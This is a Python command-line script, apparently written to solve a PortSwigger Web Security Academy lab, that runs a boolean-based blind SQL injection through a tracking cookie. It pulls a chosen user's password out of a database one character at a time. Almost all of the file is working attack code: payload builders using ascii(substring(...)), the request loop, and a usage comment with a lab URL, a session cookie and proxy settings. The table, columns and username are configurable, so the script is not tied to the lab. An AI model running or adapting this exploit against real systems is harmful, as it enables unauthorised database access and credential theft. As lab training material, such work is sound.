from __future__ import annotations

import argparse
import sys
import urllib.parse
from typing import Optional

from src.common.cli_utils import build_cli_client, parse_keyvals
from src.common.http_utils import HttpClient


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="SQLi (Boolean-based via Cookie): Extract password for a user (default: administrator)."
    )

    # positional
    _ = p.add_argument("url", help="Base URL, e.g. https://target.web-security-academy.net")

    # request target
    _ = p.add_argument("--endpoint", default="/", help="Endpoint path (default: %(default)s)")
    _ = p.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method")
    _ = p.add_argument("--param-name", default=None, help="Optional param to include base-value in (query/body)")
    _ = p.add_argument("--base-value", default=None, help="Optional benign base value for --param-name")

    # injection via cookie
    _ = p.add_argument("--cookie-name", default="TrackingId", help="Cookie name carrying the injection")
    _ = p.add_argument("--cookie-base", default="", help="Baseline value prefixed before the payload")
    _ = p.add_argument("--true-marker", default="Welcome", help="Substring that indicates TRUE condition in response")
    _ = p.add_argument(
        "--session-cookie", default=None, metavar="NAME=VALUE",
        help="Optional static session cookie to include (e.g. session=abcd)"
    )

    # extraction target
    _ = p.add_argument("--table", default="users", help="Users table name (default: %(default)s)")
    _ = p.add_argument("--user-column", default="username", help="Username column (default: %(default)s)")
    _ = p.add_argument("--pass-column", default="password", help="Password column (default: %(default)s)")
    _ = p.add_argument("--username", default="administrator", help="Target username (default: %(default)s)")

    # search space
    _ = p.add_argument("--max-len", type=int, default=20, help="Max password length to try (default: %(default)s)")
    _ = p.add_argument("--first", type=int, default=32, help="First ASCII (inclusive) (default: %(default)s)")
    _ = p.add_argument("--last", type=int, default=126, help="Last ASCII (inclusive) (default: %(default)s)")

    # plumbing
    _ = p.add_argument("--proxy", default=None, help="HTTP/HTTPS proxy (e.g. http://127.0.0.1:8080)")
    _ = p.add_argument("--insecure", action="store_true", help="Disable TLS verification (useful with Burp)")
    _ = p.add_argument("--timeout", type=float, default=10.0, help="HTTP timeout seconds (default: %(default)s)")

    # optional extras
    _ = p.add_argument("--cookie", action="append", default=[], metavar="NAME=VALUE", help="Extra cookies (repeatable)")
    _ = p.add_argument("--header", action="append", default=[], metavar="Name: Value", help="Extra headers (repeatable)")
    _ = p.add_argument("--base-param", action="append", default=[], metavar="KEY=VALUE",
                       help="Baseline query/body params (repeatable)")

    return p.parse_args(argv)


def _send_probe(
    client: HttpClient,
    *,
    method: str,
    endpoint: str,
    param_name: Optional[str],
    base_value: Optional[str],
    cookies: dict[str, str],
    headers: dict[str, str],
    base_params: dict[str, str],
) -> str:
    """
    Send a single probe request and return response body text.
    Uses client.session.get/post directly (Option 1).
    """
    url = client.base_url + endpoint
    if method == "GET":
        params = dict(base_params)
        if param_name and base_value is not None:
            params[param_name] = base_value
        res = client.session.get(
            url,
            params=params,
            headers=headers,
            cookies=cookies,
            timeout=client.timeout,
            verify=client.verify_tls,
        )
    else:
        data = dict(base_params)
        if param_name and base_value is not None:
            data[param_name] = base_value
        res = client.session.post(
            url,
            data=data,
            headers=headers,
            cookies=cookies,
            timeout=client.timeout,
            verify=client.verify_tls,
        )
    return res.text


def _condition_true(
    client: HttpClient,
    *,
    method: str,
    endpoint: str,
    param_name: Optional[str],
    base_value: Optional[str],
    cookie_name: str,
    cookie_base: str,
    payload_sql: str,
    true_marker: str,
    static_cookies: dict[str, str],
    headers: dict[str, str],
    base_params: dict[str, str],
) -> bool:
    """
    Place the encoded payload into the injection cookie and evaluate whether the truth marker is present.
    """
    inj = cookie_base + urllib.parse.quote(payload_sql, safe="")
    cookies = dict(static_cookies)
    cookies[cookie_name] = inj

    body = _send_probe(
        client,
        method=method,
        endpoint=endpoint,
        param_name=param_name,
        base_value=base_value,
        cookies=cookies,
        headers=headers,
        base_params=base_params,
    )
    return true_marker in body


def _build_ascii_eq_pred(pos: int, code: int, *, table: str, ucol: str, pcol: str, username: str) -> str:
    """
    Build a boolean predicate that is TRUE when ascii(substring(password,pos,1)) == code (MySQL syntax).
    Example: ' AND (SELECT ascii(substring(password,1,1)) FROM users WHERE username='administrator')=97-- -
    """
    return (
        f"' AND (SELECT ascii(substring({pcol},{pos},1)) "
        f"FROM {table} WHERE {ucol}='{username}')={code}-- -"
    )


def extract_password(
    client: HttpClient,
    *,
    endpoint: str,
    method: str,
    param_name: Optional[str],
    base_value: Optional[str],
    cookie_name: str,
    cookie_base: str,
    true_marker: str,
    table: str,
    user_column: str,
    pass_column: str,
    username: str,
    max_len: int,
    first_ascii: int,
    last_ascii: int,
    static_cookies: dict[str, str],
    headers: dict[str, str],
    base_params: dict[str, str],
) -> str:
    """
    Extract password via boolean-based blind SQLi (cookie channel).
    """
    pw_chars: list[str] = []

    for pos in range(1, max_len + 1):
        found = False
        for code in range(first_ascii, last_ascii + 1):
            payload = _build_ascii_eq_pred(
                pos, code, table=table, ucol=user_column, pcol=pass_column, username=username
            )
            ok = _condition_true(
                client,
                method=method,
                endpoint=endpoint,
                param_name=param_name,
                base_value=base_value,
                cookie_name=cookie_name,
                cookie_base=cookie_base,
                payload_sql=payload,
                true_marker=true_marker,
                static_cookies=static_cookies,
                headers=headers,
                base_params=base_params,
            )
            if ok:
                pw_chars.append(chr(code))
                # show progressive result on one line
                sys.stdout.write("\r" + "".join(pw_chars))
                sys.stdout.flush()
                found = True
                break
            else:
                # optional: show current guess (like your original)
                sys.stdout.write("\r" + "".join(pw_chars) + chr(code))
                sys.stdout.flush()

        if not found:
            # stop if no character matched at this position
            break

    sys.stdout.write("\n")
    sys.stdout.flush()
    return "".join(pw_chars)


def main(argv: list[str]) -> int:
    args = parse_args(argv)

    client = build_cli_client(
        args.url,
        proxy=args.proxy,
        insecure=args.insecure,
        timeout=args.timeout,
    )

    headers = parse_keyvals(args.header, ":")
    base_params = parse_keyvals(args.base_param, "=")

    # Base cookies: include optional session + any user-provided cookies
    cookies = parse_keyvals(args.cookie, "=")
    if args.session_cookie:
        cookies.update(parse_keyvals([args.session_cookie], "="))

    print("[+] Extracting password via boolean-based blind SQLi (cookie channel)...")
    try:
        password = extract_password(
            client,
            endpoint=args.endpoint,
            method=args.method,
            param_name=args.param_name,
            base_value=args.base_value,
            cookie_name=args.cookie_name,
            cookie_base=args.cookie_base,
            true_marker=args.true_marker,
            table=args.table,
            user_column=args.user_column,
            pass_column=args.pass_column,
            username=args.username,
            max_len=args.max_len,
            first_ascii=args.first,
            last_ascii=args.last,
            static_cookies=cookies,
            headers=headers,
            base_params=base_params,
        )
    except Exception as exc:
        print(f"[-] Request failed: {exc}")
        return 2

    if password:
        print(f"[+] Extracted password for {args.username}: {password}")
        return 0
    else:
        print("[-] Unable to extract password (no characters found).")
        return 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))

# Usage example:
# python -m src.sqli.lab09 \
# https://TARGET.web-security-academy.net \
# --endpoint / \
# --cookie-name TrackingId \
# --cookie-base dCqiyv8E4BfhhpHL \
# --true-marker Welcome \
# --session-cookie "session=bdb4dZfXEcfucciq98jCIYBJW4NL7y7M" \
# --max-len 20 --first 32 --last 126 \
# --proxy http://127.0.0.1:8080 --insecure
